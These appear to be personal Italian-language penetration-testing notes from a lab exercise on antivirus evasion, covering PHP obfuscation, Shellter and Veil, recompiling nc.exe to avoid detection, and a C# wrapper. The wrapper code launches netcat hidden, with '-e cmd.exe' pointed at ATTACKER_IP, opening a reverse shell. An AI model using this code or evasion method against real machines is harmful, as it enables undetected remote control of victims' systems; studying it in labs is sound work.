## Theory

[[AV Bypass Theory]]

## Tools & Practice

#### PHP Obfuscation 

E' possibile obfuscare PHP per evadere check base di antivirus. Nel mio caso sulla macchina Wreath non ne ho avuto bisogno ma in generale e' buono passare i propri script su un ubfuscator online come:



#### Shellter & Veil

Shellter e' un vecchio progetto di DLL injection all-interno di windows PE (EXECUTABLES). La parola chiave qua e' "vecchio". Questo significa che, oltre alla versione premium di shellter, non e' molto affidabile il risultato.

Veil e' un framework piu recente per offuscare eseguibili.

https://github.com/Veil-Framework/Veil


## Cross Compiling
#### nc.exe recompiled
nc.exe ha uns acco di versioni online e quella precompilata in kali e' riconosciuta da AV.
Clonando la repo, modificando un po lo script e ricompilandolo dovrei essere in grado di bypassare soluzioni av piu comuni.

Nel caso di nc.exe nella repo e; presente un Makefile con i vari step di compilazione impostati.
**In generale invece di passare gli argument di compilazione a caso e; sempre meglio modificare un makefile con le impostazioni di compilazioni (generalmente il binary del compiler) specifiche.

La cosa che infatti ci interessa e' il compiler. Nel caso di windows **x64** su linux usiamo `mingw-w64`.

**Ricordiamoci che questo e' chiamato Cross-Compiling**

In particolare il binary che ci interessa e': x86_64-w64-mingw32-gcc

ci sono un sacco di binaries del compiler, basta tabbare parte del comando `x86_64-` per vederli.

Una volta modificato, dentro la stessa directory del Makefile facciamo `make`.

Ora possiamo caricare e sperare che l'av non rompa il cazzo.


#### Create an executable wrapper for a malicious executable
Ovvero come crearci un .exe che permette di eseguire binary (possibilmente che abbiamo testato non vengono rilevati dal defender).

usando `mono-devel` possiamo compilare codice c# come se fossimo su visual studio

Creiamo un file `Wrapper.cs`
Questo il codice:

```
using System;  
using System.Diagnostics;
namespace Wrapper{  
    class Program{  
        static void Main(){  
            //Our code will go here!  
			Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
			//non creare la gui
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
            proc.Start();


        }  
    }  
}

```


infine compiliamo con `mcs Wrapper.cs`